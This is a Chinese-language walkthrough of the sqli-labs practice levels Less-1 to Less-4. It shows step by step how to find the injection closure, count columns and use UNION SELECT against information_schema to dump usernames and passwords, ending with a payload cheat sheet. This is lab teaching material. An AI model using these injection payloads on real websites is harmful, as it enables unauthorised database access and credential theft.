	前言：
	学过一点MySQL的知识点的话，会非常轻松，能理解每一步都在干什么，不用看题目的源代码就能解出来！！！

推荐浏览器插件：
hackbar，好用，很舒服

### 核心知识点

| 知识点                  | 说明                      | 示例                                    |
| -------------------- | ----------------------- | ------------------------------------- |
| `--+` 的作用            | 注释掉后面多余的代码，URL 中空格用 `+` | `1' --+`                              |
| `-1` 的作用             | 让原查询返回空，确保 union 结果显示   | `id=-1' union select...`              |
| `group_concat()`     | 把多行合并成一行，避免只显示第一条       | `group_concat(table_name)`            |
| `information_schema` | MySQL 的系统库，存着所有库/表/列的信息 | `from information_schema.tables`      |
| `database()`         | 返回当前数据库名                | `union select 1,database(),3`         |
| `version()`          | 返回 MySQL 版本             | `union select 1,version(),3`          |
| 分隔符                  | 让输出更清晰                  | `group_concat(username,':',password)` |

==注入公式化技巧：==
```
找闭合 → 猜列数 → 找显示位 → 查库名 → 查表名 → 查列名 → 查数据
```

###  第一步：找闭合（判断注入类型）

### 公式化测试序列

| 步骤  | 测试 Payload     | 如果正常 → 闭合方式   | 代表关卡   |
| --- | -------------- | ------------- | ------ |
| 1   | `?id=1 --+`    | 数字型（无引号）      | Less-2 |
| 2   | `?id=1' --+`   | 单引号 `'`       | Less-1 |
| 3   | `?id=1" --+`   | 双引号 `"`       | —      |
| 4   | `?id=1') --+`  | 单引号+括号 `')`   | Less-3 |
| 5   | `?id=1") --+`  | 双引号+括号 `")`   | Less-4 |
| 6   | `?id=1')) --+` | 双括号+单引号 `'))` | 进阶关卡   |
| 7   | `?id=1")) --+` | 双括号+双引号 `"))` | 进阶关卡   |
## Less-1：字符型注入（单引号）

### 1. 后端 SQL 结构（推测）

```MySQL

SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

参数被**单引号**包裹。

### 2. 解题步骤

#### 第一步：找闭合

|测试|Payload|结果|结论|
|---|---|---|---|
|基线|`?id=1`|显示 Dumb/Dumb|正常|
|测试|`?id=1'`|报错|说明有注入|
|确认|`?id=1' --+`|正常显示 Dumb/Dumb|**闭合=`'`** ✅|

**结论**：字符型注入，闭合符号是单引号 `'`

#### 第二步：猜列数

```MySQL
?id=1' order by 1 --+   → 正常
?id=1' order by 2 --+   → 正常
?id=1' order by 3 --+   → 正常
?id=1' order by 4 --+   → 报错（Unknown column '4'）
```

**结论**：查询有 **3 列**

#### 第三步：找显示位


```MySQL

?id=-1' union select 1,2,3 --+
```

页面显示：

```text

Your Login name:2
Your Password:3
```

**结论**：第 2 列和第 3 列是显示位

#### 第四步：查数据

**查数据库名**：

```MySQL

?id=-1' union select 1,database(),3 --+
```

```
→ `security`
```

**查所有表名**：

```MySQL

?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

```

```
→ `emails,referers,uagents,users`
```

**查 users 表的列名**：

```MySQL

?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

```
→ `id,username,password`

```
**查数据**：

```MySQL

?id=-1' union select 1,group_concat(username,':',password),3 from users --+

```

```
→ `Dumb:Dumb,Angelina:I-kill-you,...`
```

### 3. 关键点

|要点|说明|
|---|---|
|闭合符号|`'`|
|注释符|`--+`（URL 中空格用 `+`）|
|让原查询为空|用 `-1`|

---

## Less-2：数字型注入

### 1. 后端 SQL 结构（推测）

```MySQL

SELECT * FROM users WHERE id=$id LIMIT 0,1

```
参数**没有引号**，直接拼接数字。

### 2. 解题步骤

#### 第一步：找闭合

|测试|Payload|结果|结论|
|---|---|---|---|
|基线|`?id=1`|显示 Dumb/Dumb|正常|
|测试|`?id=1'`|报错|说明有注入|
|确认|`?id=1 --+`|正常显示 Dumb/Dumb|**数字型** ✅|

**结论**：数字型注入，不需要引号

#### 第二步：猜列数

```MySQL

?id=1 order by 1 --+   → 正常
?id=1 order by 2 --+   → 正常
?id=1 order by 3 --+   → 正常
?id=1 order by 4 --+   → 报错
```

**结论**：查询有 **3 列**

#### 第三步：找显示位

```MySQL

?id=-1 union select 1,2,3 --+
```

页面显示：

```text

Your Login name:2
Your Password:3
```

**结论**：第 2 列和第 3 列是显示位

#### 第四步：查数据

**查数据库名**：

```MySQL

?id=-1 union select 1,database(),3 --+
```

```
→ `security`
```

**查所有表名**：

```MySQL

?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```

```
→ `emails,referers,uagents,users`
```

**查 users 表的列名**：

```MySQL

?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

```

```
→ `id,username,password`
```

**查数据**：

```MySQL

?id=-1 union select 1,group_concat(username,':',password),3 from users --+
```

```
→ `Dumb:Dumb,Angelina:I-kill-you,...`
```

### 3. 关键点

|要点|说明|
|---|---|
|闭合符号|**无**（不需要引号）|
|与 Less-1 的区别|Payload 里**没有单引号**|

---

## Less-3：字符型注入（单引号+括号）

### 1. 后端 SQL 结构（推测）
```MySQL


SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

参数被**单引号+括号**包裹。

### 2. 解题步骤

#### 第一步：找闭合

|测试|Payload|结果|结论|
|---|---|---|---|
|基线|`?id=1`|显示 Dumb/Dumb|正常|
|测试|`?id=1'`|报错|说明有注入|
|试探1|`?id=1' --+`|报错|不是普通单引号|
|试探2|`?id=1') --+`|正常显示 Dumb/Dumb|**闭合=`')`** ✅|

**结论**：字符型注入，闭合符号是 `')`

#### 第二步：猜列数

```MySQL

?id=1') order by 1 --+   → 正常
?id=1') order by 2 --+   → 正常
?id=1') order by 3 --+   → 正常
?id=1') order by 4 --+   → 报错
```

**结论**：查询有 **3 列**

#### 第三步：找显示位

```MySQL

?id=-1') union select 1,2,3 --+
```

页面显示：

```text

Your Login name:2
Your Password:3
```

**结论**：第 2 列和第 3 列是显示位

#### 第四步：查数据

**查数据库名**：

```MySQL

?id=-1') union select 1,database(),3 --+

→ `security`
```

**查所有表名**：

```MySQL

?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

→ `emails,referers,uagents,users`
```

**查 users 表的列名**：

```MySQL

?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

→ `id,username,password`
```

**查数据**：

```MySQL

?id=-1') union select 1,group_concat(username,':',password),3 from users --+

→ `Dumb:Dumb,Angelina:I-kill-you,...`
```

### 3. 关键点

|要点|说明|
|---|---|
|闭合符号|`')`|
|与 Less-1 的区别|多了一个右括号|

---

## Less-4：字符型注入（双引号+括号）

### 1. 后端 SQL 结构（推测）

```MySQL

SELECT * FROM users WHERE id=("$id") LIMIT 0,1
```

参数被**双引号+括号**包裹。

### 2. 解题步骤

#### 第一步：找闭合

|测试|Payload|结果|结论|
|---|---|---|---|
|基线|`?id=1`|显示 Dumb/Dumb|正常|
|测试|`?id=1'`|报错|说明有注入|
|试探1|`?id=1' --+`|报错|不是单引号|
|试探2|`?id=1" --+`|报错|不是普通双引号|
|试探3|`?id=1') --+`|报错|不是单引号+括号|
|试探4|`?id=1") --+`|正常显示 Dumb/Dumb|**闭合=`")`** ✅|

**结论**：字符型注入，闭合符号是 `")`

#### 第二步：猜列数

```MySQL

?id=1") order by 1 --+   → 正常
?id=1") order by 2 --+   → 正常
?id=1") order by 3 --+   → 正常
?id=1") order by 4 --+   → 报错
```

**结论**：查询有 **3 列**

#### 第三步：找显示位

```MySQL

?id=-1") union select 1,2,3 --+
```

页面显示：

```text

Your Login name:2
Your Password:3
```

**结论**：第 2 列和第 3 列是显示位

#### 第四步：查数据

**查数据库名**：

```MySQL

?id=-1") union select 1,database(),3 --+

→ `security`
```

**查所有表名**：

```MySQL

?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

→ `emails,referers,uagents,users`
```

**查 users 表的列名**：

```MySQL

?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

→ `id,username,password`
```

**查数据**：

```MySQL

?id=-1") union select 1,group_concat(username,':',password),3 from users --+

→ `Dumb:Dumb,Angelina:I-kill-you,...`
```


# Less-1 ~ Less-4 速查表

|关卡|注入类型|闭合符号|测试 Payload|查数据 Payload 示例|
|---|---|---|---|---|
|Less-1|字符型|`'`|`?id=1' --+`|`-1' union select 1,group_concat(username,':',password),3 from users --+`|
|Less-2|数字型|无|`?id=1 --+`|`-1 union select 1,group_concat(username,':',password),3 from users --+`|
|Less-3|字符型|`')`|`?id=1') --+`|`-1') union select 1,group_concat(username,':',password),3 from users --+`|
|Less-4|字符型|`")`|`?id=1") --+`|`-1") union select 1,group_concat(username,':',password),3 from users --+`|


### 常见报错及解决

| 报错信息                                   | 原因      | 解决方法                                  |
| -------------------------------------- | ------- | ------------------------------------- |
| `Unknown column '4' in 'order clause'` | 列数小于 4  | 列数 = 报错数字 - 1                         |
| `You have an error in your SQL syntax` | 闭合符号不对  | 换一种闭合方式重试                             |
| `Illegal mix of collations`            | 字符集问题   | 用 `convert(column_name using latin1)` |
| 页面显示正常但无数据                             | 表是空的    | 换一张表查                                 |
| `union` 结果不显示                          | 第一查询有数据 | 用 `-1` 让第一查询返回空                       |